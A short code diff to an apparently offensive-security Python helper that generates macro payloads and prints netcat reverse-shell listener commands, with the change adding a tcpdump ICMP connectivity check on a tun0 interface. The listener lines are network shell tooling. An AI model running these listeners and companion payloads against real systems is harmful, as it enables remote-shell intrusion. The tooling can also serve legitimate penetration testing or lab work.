@@ -61,6 +61,9 @@ def macro(pay):
     print(f'End Sub')
 
 def print_listener(port):
+
+    print("\n********** Connectivity **********\n")
+    print("tcpdump -i tun0 icmp -n\n")
     print("\n********** Listener **********\n")
     print(f"stty raw -echo; (stty size; cat) | nc -lvnp {port}")
     print(f"rlwrap -cAr nc -nlvp {port}")
